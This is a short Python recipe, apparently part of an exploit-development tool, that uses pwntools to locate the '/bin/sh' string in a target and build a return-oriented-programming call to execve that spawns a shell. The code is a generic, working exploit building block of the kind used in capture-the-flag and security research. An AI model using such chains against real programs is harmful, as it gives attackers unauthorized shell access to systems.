"""pwntools recipe — execve("/bin/sh", NULL, NULL) on x86-64.

Mirror of ropchains/rop3/syscall_exec_amd64.txt and the angrop recipe. pwntools'
native idiom is a ret2libc call: resolve the execve() export and the "/bin/sh"
string already present in the target (libc has both), then let ROP assemble the
argument-register setup. The worker calls rop.chain() afterwards. Unresolvable on
a target lacking the symbol or the string (reported not-found).
"""


def build(elf, rop):
    binsh = next(elf.search(b"/bin/sh\x00"))
    rop.call("execve", [binsh, 0, 0])
